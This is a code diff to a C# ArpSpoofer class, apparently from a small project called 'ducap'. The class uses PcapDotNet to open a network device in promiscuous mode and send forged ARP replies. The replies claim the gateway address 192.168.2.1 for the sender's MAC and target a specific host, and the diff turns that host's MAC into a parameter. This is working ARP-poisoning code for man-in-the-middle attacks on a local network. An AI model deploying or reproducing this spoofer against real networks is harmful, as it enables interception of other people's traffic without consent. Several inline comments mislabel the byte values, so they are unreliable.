@@ -9,6 +9,7 @@ using PcapDotNet.Packets;
 using PcapDotNet.Packets.Arp;
 using PcapDotNet.Packets.Ethernet;
 using System.Threading;
+using System.Globalization;
 
 namespace ducap
 {
@@ -17,12 +18,16 @@ namespace ducap
 
 
         public PacketCommunicator communicator;
+        private static string[] _host;
 
-       public ArpSpoofer()
-        {   // Retrieve the device list from the local machine
+       public ArpSpoofer(string[] host)
+        {
+            _host = host;
+            // Retrieve the device list from the local machine
             IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
             PacketDevice selectedDevice = allDevices[0];
             communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);
+            
         }
 
         public void sendArpSpoof() {
@@ -43,12 +48,18 @@ namespace ducap
 
         private static Packet BuildArpPacket()
         {
+
+            byte[] mama = _host[0].Split('.')
+                 .Select(t => byte.Parse(t, NumberStyles.AllowHexSpecifier))
+                 .ToArray();
+
+
             EthernetLayer ethernetLayer =
                 new EthernetLayer
                 {
                     
                     Source = new MacAddress("90:2b:34:33:35:f3"),
-                    Destination = new MacAddress("84:4b:f5:1a:81:f6"),
+                    Destination = new MacAddress(_host[0]),
                     EtherType = EthernetType.Arp, // Will be filled automatically.
                 };
 
@@ -57,9 +68,11 @@ namespace ducap
                 {
                     ProtocolType = EthernetType.IpV4,
                     Operation = ArpOperation.Reply,
-                    //156, 128, 223, 132, 155, 156
-                   // 144, 43, 52, 51, 53, 243
-                    SenderHardwareAddress = new byte[] { 144, 43, 52, 51, 53, 243 }.AsReadOnly(), // 03:03:03:03:03:03.
+
+                  
+            //156, 128, 223, 132, 155, 156
+            // 144, 43, 52, 51, 53, 243
+            SenderHardwareAddress = new byte[] { 144, 43, 52, 51, 53, 243 }.AsReadOnly(), // 03:03:03:03:03:03.
                     SenderProtocolAddress = new byte[] { 192,168, 2, 1 }.AsReadOnly(), // 1.2.3.4.
                     TargetHardwareAddress = new byte[] { 132, 75, 245, 26, 129, 246 }.AsReadOnly(), // 04:04:04:04:04:04.
                     TargetProtocolAddress = new byte[] { 192, 168, 2, 176 }.AsReadOnly(), // 11.22.33.44.
